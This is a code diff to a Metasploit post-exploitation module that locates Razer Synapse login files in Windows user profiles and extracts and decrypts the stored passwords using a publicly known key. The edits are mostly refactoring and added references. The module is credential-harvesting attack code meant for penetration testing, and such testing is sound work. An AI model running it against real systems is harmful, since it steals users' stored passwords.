@@ -15,6 +15,7 @@ class Metasploit3 < Msf::Post
 
 	include Msf::Post::Common
 	include Msf::Post::Windows::UserProfiles
+	include Msf::Post::File
 
 	def initialize(info={})
 		super(update_info(info,
@@ -23,7 +24,7 @@ class Metasploit3 < Msf::Post
 					This module will enumerate passwords stored by the Razer Synapse
 					client. The encryption key and iv is publicly known. This module
 					will not only extract encrypted password but will also decrypt
-					password using public key. Affects version 1.7.15 and earlier.
+					password using public key. Affects versions earlier than 1.7.15.
 				},
 			'License'        => MSF_LICENSE,
 			'Author'         =>
@@ -32,9 +33,13 @@ class Metasploit3 < Msf::Post
 					'Matt Howard "pasv" <themdhoward[at]gmail.com>', #PoC
 					'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
 				],
+			'References'    =>
+				[
+					[ 'URL', 'http://www.pentestgeek.com/2013/01/16/hard-coded-encryption-keys-and-more-wordpress-fun/' ],
+					[ 'URL', 'https://github.com/pasv/Testing/blob/master/Razer_decode.py' ]
+				],
 			'SessionTypes'   => [ 'meterpreter' ],
-			'Platform'      => [ 'win' ],
-
+			'Platform'      => [ 'win' ]
 		))
 	end
 
@@ -61,7 +66,7 @@ class Metasploit3 < Msf::Post
 	def store_creds(user, pass)
 		if db
 			report_auth_info(
-				:host   => client.sock.peerhost,
+				:host   => Rex::Socket.resolv_to_dotted("www.razerzone.com"),
 				:port   => 443,
 				:ptype  => 'password',
 				:sname  => 'razer_synapse',
@@ -98,13 +103,10 @@ class Metasploit3 < Msf::Post
 		grab_user_profiles().each do |user|
 			if user['LocalAppData']
 				accounts = user['LocalAppData'] + "\\Razer\\Synapse\\Accounts\\RazerLoginData.xml"
-				# open the file for reading
-				config = client.fs.file.new(accounts, 'r') rescue nil
-				next if config.nil?
+				next if not file?(accounts)
 				print_status("Config found for user #{user['UserName']}")
 
-				contents = config.read
-				config.close
+				contents = read_file(accounts)
 
 				# read the contents of file
 				creds = parse_config(contents)
